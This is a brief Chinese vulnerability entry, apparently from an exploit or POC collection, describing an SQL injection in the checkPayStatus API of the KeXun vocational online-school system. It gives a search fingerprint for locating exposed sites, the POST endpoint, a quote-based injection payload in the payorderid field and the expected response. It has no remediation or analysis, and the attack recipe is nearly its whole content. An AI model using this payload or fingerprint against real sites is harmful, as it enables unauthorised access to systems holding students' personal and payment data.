# 科汛新职教网校系统checkPayStatus存在SQL注入漏洞

科汛新职教网校系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/KS_Inc/static/edu"`
- **请求**：`POST /Webapi/Common/checkPayStatus HTTP/1.1`

**Payload**
```
{"payorderid":"1'","apptoken":"1"}
```
- **响应特征**：200